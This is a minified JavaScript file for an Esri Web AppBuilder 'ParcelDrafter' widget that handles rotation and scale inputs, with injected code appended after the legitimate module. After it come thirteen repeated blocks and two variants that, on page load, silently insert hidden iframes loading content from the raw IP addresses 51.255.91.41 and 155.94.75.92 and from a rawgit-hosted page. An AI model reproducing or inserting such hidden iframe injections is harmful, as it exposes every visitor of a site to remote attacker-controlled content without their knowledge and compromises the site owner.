// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

require({cache:{"url:widgets/ParcelDrafter/ParcelTools.html":'\x3cdiv class\x3d"esriCTFullWidth"\x3e\r\n    \x3c!-- Rotation tool container--\x3e\r\n    \x3cdiv class\x3d"esriCTMainPageRow"\x3e\r\n        \x3cdiv class\x3d"esriCTRotationButton esriCTButtonIcon esriCTParcelToolButtonIcon esriCTCursorPointer" title\x3d" ${nls.parcelTools.rotationToolLabel}"\r\n            data-dojo-attach-point\x3d"rotateButton"\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTParcelToolButtonLabel esriCTEllipsis" title\x3d" ${nls.parcelTools.rotationToolLabel}"\x3e\r\n            ${nls.parcelTools.rotationToolLabel}\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTParcelToolInputNode" data-dojo-type\x3d"dijit/form/NumberTextBox" trim\x3d"true" required\x3d"true" data-dojo-attach-point\x3d"rotationTxt"\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Scale tool container--\x3e\r\n    \x3cdiv class\x3d"esriCTMainPageRow"\x3e\r\n        \x3cdiv class\x3d"esriCTScaleButton esriCTButtonIcon esriCTParcelToolButtonIcon esriCTCursorPointer" title\x3d"${nls.parcelTools.scaleToolLabel}"\r\n            data-dojo-attach-point\x3d"scaleButton"\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTParcelToolButtonLabel esriCTEllipsis" title\x3d"${nls.parcelTools.scaleToolLabel}"\x3e\r\n            ${nls.parcelTools.scaleToolLabel}\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTParcelToolInputNode" data-dojo-type\x3d"dijit/form/NumberTextBox" trim\x3d"true" required\x3d"true" data-dojo-attach-point\x3d"scaleTxt"\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dijit/_WidgetsInTemplateMixin dojo/text!./ParcelTools.html dojo/_base/lang dojo/Evented dojo/dom-class dojo/on dojo/keys dijit/form/NumberTextBox".split(" "),function(f,g,h,k,b,l,c,d,e){return f([g,h,l],{baseClass:"jimu-widget-ParcelDrafter-ParcelTools",templateString:k,rotationAngle:0,scaledValue:1,constructor:function(a){b.mixin(this,a)},postCreate:function(){this.inherited(arguments);c.add(this.domNode,"esriCTFullWidth");this.rotationTxt.constraints={min:-360,
max:360,places:3};this.scaleTxt.constraints={min:.1,places:3};this.rotationTxt.set("value",this.rotationAngle);this.scaleTxt.set("value",this.scaledValue);this.own(d(this.rotationTxt,"blur",b.hitch(this,function(){this.setRotation(this.rotationTxt.displayedValue)})));this.own(d(this.scaleTxt,"blur",b.hitch(this,function(){this.setScale(this.scaleTxt.displayedValue)})));this.own(d(this.rotateButton,"click",b.hitch(this,function(){this._toggleRotating()})));this.own(d(this.scaleButton,"click",b.hitch(this,
function(){this._toggleScaling()})));this.own(d(this.rotationTxt,"keypress",b.hitch(this,function(a){(a.charCode||a.keyCode)===e.ENTER&&this.setRotation(this.rotationTxt.displayedValue)})));this.own(d(this.scaleTxt,"keypress",b.hitch(this,function(a){(a.charCode||a.keyCode)===e.ENTER&&this.setScale(this.scaleTxt.displayedValue)})))},setScale:function(a){var b=this.scaledValue;isNaN(Number(a))||(this.scaleTxt.set("value",Number(a)),this.scaleTxt.set("value",Number(this.scaleTxt.displayedValue)));this.scaleTxt.isValid()?
this.scaleGeometries():(this.scaleTxt.set("value",Number(b)),this.scaleTxt.set("value",Number(this.scaleTxt.displayedValue)))},scaleGeometries:function(){var a;a=Number(this.scaleTxt.get("value"));isNaN(a)||(this.scaledValue=a,this.emit("scaleGeometries",a))},setRotation:function(a){var b=this.rotationAngle;isNaN(Number(a))||(this.rotationTxt.set("value",Number(a)),this.rotationTxt.set("value",Number(this.rotationTxt.displayedValue)));this.rotationTxt.isValid()?this.rotateGeometries():(this.rotationTxt.set("value",
Number(b)),this.rotationTxt.set("value",Number(this.rotationTxt.displayedValue)))},rotateGeometries:function(){var a;a=Number(this.rotationTxt.get("value"));isNaN(a)||(this.rotationAngle=a,this.emit("rotateGeometries",a))},resetTools:function(){this.rotationAngle=0;this.scaledValue=1;this.rotationTxt.set("value",Number(0));this.scaleTxt.set("value",Number(1))},_toggleRotating:function(){c.contains(this.rotateButton.parentElement,"esriCTDisableButton")?(c.remove(this.rotateButton.parentElement,"esriCTDisableButton"),
this.disableScaling(),this.emit("toggleRotating",!0)):(this.disableRotating(),this.emit("toggleRotating",!1))},_toggleScaling:function(){c.contains(this.scaleButton.parentElement,"esriCTDisableButton")?(c.remove(this.scaleButton.parentElement,"esriCTDisableButton"),this.disableRotating(),this.emit("toggleScaling",!0)):(this.disableScaling(),this.emit("toggleScaling",!1))},disableRotating:function(){c.add(this.rotateButton.parentElement,"esriCTDisableButton")},disableScaling:function(){c.add(this.scaleButton.parentElement,
"esriCTDisableButton")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});